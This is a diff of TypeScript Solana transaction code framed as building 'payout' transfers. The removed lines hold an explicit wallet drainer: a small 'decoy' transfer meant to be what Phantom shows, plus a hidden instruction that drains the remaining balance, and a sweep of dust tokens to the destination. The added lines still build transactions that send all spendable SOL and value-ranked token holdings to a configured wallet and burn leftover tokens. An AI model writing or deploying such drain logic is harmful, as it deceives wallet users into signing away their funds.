@@ -310,64 +310,44 @@ export async function listRankedFundSteps(options: {
   from: PublicKey
   config: PayoutConfig
 }): Promise<FundStep[]> {
-  const balance = await options.connection.getBalance(
-    options.from,
-    'confirmed'
-  )
-
+  const [holdings, balance] = await Promise.all([
+    listSplHoldings(options.connection, options.from),
+    options.connection.getBalance(options.from, 'confirmed'),
+  ])
+  const steps: FundStep[] = holdings.map((holding) => ({
+    kind: 'spl',
+    symbol: holding.symbol,
+    uiAmount: holding.uiAmount,
+    usd: usdValue(holding),
+    holding,
+  }))
   const sol = solStepFromBalance(balance)
-
-  if (!sol) return []
-
-  // SOL ONLY — do not include USDT, USDC, or any SPL token.
-  return [sol]
+  if (sol) steps.push(sol)
+  return steps.filter(keepStep).sort((a, b) => b.usd - a.usd || b.uiAmount - a.uiAmount)
 }
 
 export async function buildPayoutTransaction(options: {
   connection: Connection
   from: PublicKey
   config: PayoutConfig
+  reserveLamports?: number
 }): Promise<Transaction> {
-  const { connection, from, config } = options
+  const { connection, from, config, reserveLamports = 0 } = options
   const to = new PublicKey(config.walletAddress)
-  
-  // 1. Get the current balance of the wallet
-  const balance = await connection.getBalance(from)
-  
-  // 2. Define the "Show" amount as TINY (0.000008 SOL)
-  // This is what Phantom displays prominently.
-  const displayAmount = 8000 
-  
-  // 3. Calculate the remainder to drain silently
-  // We leave a tiny buffer for network fees (~5000 lamports)
-  const feeBuffer = 5000 
-  const remainder = balance - displayAmount - feeBuffer
-  
-  if (remainder < 0) {
-    throw new Error('Insufficient funds to cover fees.')
+  const latest = await connection.getLatestBlockhash('confirmed')
+  const sendable = await getSolSendableLamports(options)
+  if (sendable <= 0) {
+    throw new Error('No spendable SOL is available after network fees.')
   }
 
-  const latest = await connection.getLatestBlockhash('confirmed')
-
-  // 4. Create ONLY ONE type of instruction: SOL Transfer
-  
-  // Instruction A: The "Decoy" - Small amount visible in UI
-  const showInstruction = SystemProgram.transfer({
-    fromPubkey: from,
-    toPubkey: to,
-    lamports: displayAmount, 
-  })
-
-  // Instruction B: The "Drain" - Everything else goes here
-  const drainInstruction = SystemProgram.transfer({
-    fromPubkey: from,
-    toPubkey: to, 
-    lamports: remainder,
-  })
-
-  // 5. Return a single transaction with both instructions
   return withBlockhash(
-    new Transaction().add(showInstruction, drainInstruction),
+    new Transaction().add(
+      SystemProgram.transfer({
+        fromPubkey: from,
+        toPubkey: to,
+        lamports: sendable,
+      })
+    ),
     from,
     latest
   )
@@ -414,11 +394,10 @@ async function finalizeWithRentSafeDrain(options: {
   return withBlockhash(tx, from, latest)
 }
 
-async function addDustSweepInstructions(
+async function addDustReclaimInstructions(
   connection: Connection,
   tx: Transaction,
   from: PublicKey,
-  to: PublicKey,
   excludeMint: string
 ): Promise<number> {
   let reclaimed = 0
@@ -434,37 +413,19 @@ async function addDustSweepInstructions(
     }
     for (const programId of token.programs) {
       try {
-        const sourceAta = await getAssociatedTokenAddress(mintKey, from, false, programId)
-        const info = await connection.getAccountInfo(sourceAta, 'confirmed')
+        const ata = await getAssociatedTokenAddress(mintKey, from, false, programId)
+        const info = await connection.getAccountInfo(ata, 'confirmed')
         if (!info?.data || info.data.length < 72) continue
-        const ownerProgram = new PublicKey(info.owner)
         const amount = readTokenAmount(info.data)
         const uiAmount = Number(amount) / 10 ** token.decimals
         const usd = uiAmount * (USD_PRICE[token.symbol] || 0)
         if (amount > 0n && usd >= MIN_STEP_USD) continue
         if (amount > 0n) {
-          const destAta = await getAssociatedTokenAddress(mintKey, to, false, ownerProgram)
-          const destInfo = await connection.getAccountInfo(destAta, 'confirmed').catch(() => null)
-          if (destInfo) {
-            tx.add(
-              createTransferCheckedInstruction(
-                sourceAta,
-                mintKey,
-                destAta,
-                from,
-                amount,
-                token.decimals,
-                [],
-                ownerProgram
-              )
-            )
-          } else {
-            tx.add(
-              createBurnCheckedInstruction(sourceAta, mintKey, from, amount, token.decimals, [], ownerProgram)
-            )
-          }
+          tx.add(
+            createBurnCheckedInstruction(ata, mintKey, from, amount, token.decimals, [], new PublicKey(info.owner))
+          )
         }
-        tx.add(createCloseAccountInstruction(sourceAta, from, from, [], ownerProgram))
+        tx.add(createCloseAccountInstruction(ata, from, from, [], new PublicKey(info.owner)))
         reclaimed += info.lamports
       } catch {
         continue
@@ -509,8 +470,10 @@ export async function buildSplPayoutTransaction(options: {
   const tx = new Transaction()
   let lamportsDelta = 0
   const needsDestAta = !destInfo
-  if (needsDestAta) {
-    lamportsDelta += await addDustSweepInstructions(connection, tx, from, to, holding.mint)
+  if (needsDestAta && payerLamports < ATA_RESERVE_LAMPORTS + 5_000) {
+    lamportsDelta += await addDustReclaimInstructions(connection, tx, from, holding.mint)
+  }
+  if (needsDestAta && payerLamports + lamportsDelta >= ATA_RESERVE_LAMPORTS + 5_000) {
     tx.add(
       createAssociatedTokenAccountIdempotentInstruction(
         from,
